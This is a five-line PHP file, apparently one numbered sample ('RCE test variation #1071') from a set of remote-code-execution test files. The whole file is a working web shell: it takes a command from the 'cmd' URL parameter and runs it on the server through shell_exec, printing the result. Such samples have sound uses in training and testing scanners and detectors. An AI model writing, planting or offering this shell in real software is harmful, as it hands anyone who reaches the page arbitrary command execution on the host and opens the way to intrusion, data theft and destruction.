<?php
// RCE test variation #1071
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>